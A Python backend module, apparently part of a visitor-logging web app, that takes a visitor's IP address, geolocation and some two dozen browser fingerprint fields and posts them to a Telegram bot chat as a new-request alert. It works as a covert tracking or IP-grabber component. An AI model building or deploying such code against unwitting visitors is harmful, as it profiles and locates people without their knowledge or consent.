"""Partially by the author: Weever, modified by BRamil. Github: https://github.com/Weever1337"""

import aiohttp
from fastapi import Request
from typing import Dict, Any
from src.backend.telegram.models import TelegramInformant
from src.backend.telegram.ip_handler import IPAddressHandler
from src.config.config import settings
from src.backend.core.shielding import shielding_markdown_v2

class TelegramSender:
    def __init__(self) -> None:
        self.url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage"

    async def send(self, request: Request, form: TelegramInformant) -> Dict[str, Any]:
        ip = IPAddressHandler(request)
        chat_id = settings.TELEGRAM_CHAT_ID
        params = {
            "chat_id": chat_id,
            "text": fr"""
**Новий запит:**

```
Location: {await shielding_markdown_v2(await ip.get_location())}
IP: {await shielding_markdown_v2(ip.ip)}

JS:
innerWidth: {await shielding_markdown_v2(form.innerWidth)}
innerHeight: {await shielding_markdown_v2(form.innerHeight)}
screen_width: {await shielding_markdown_v2(form.screen_width)}
screen_height: {await shielding_markdown_v2(form.screen_height)}
userAgent: {await shielding_markdown_v2(form.userAgent)}
platform: {await shielding_markdown_v2(form.platform)}
language: {await shielding_markdown_v2(form.language)}
location_href: {await shielding_markdown_v2(form.location_href)}
connection_downlink: {await shielding_markdown_v2(form.connection_downlink)}
connection_effective_type: {await shielding_markdown_v2(form.connection_effective_type)}
online: {await shielding_markdown_v2(form.online)}
performance_timing: {await shielding_markdown_v2(form.performance_timing)}
max_touch_points: {await shielding_markdown_v2(form.max_touch_points)}
hardware_concurrency: {await shielding_markdown_v2(form.hardware_concurrency)}
device_memory: {await shielding_markdown_v2(form.device_memory)}
color_depth: {await shielding_markdown_v2(form.color_depth)}
pixel_depth: {await shielding_markdown_v2(form.pixel_depth)}
timezone: {await shielding_markdown_v2(form.timezone)}
cookies_enabled: {await shielding_markdown_v2(form.cookies_enabled)}
referrer: {await shielding_markdown_v2(form.referrer)}
visibility_state: {await shielding_markdown_v2(form.visibility_state)}
document_title: {await shielding_markdown_v2(form.document_title)}
page_load_time: {await shielding_markdown_v2(form.page_load_time)}
```

\#новий\_запит
""",
            "parse_mode": "MarkdownV2",
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(self.url, json=params) as response:
                return await response.json()
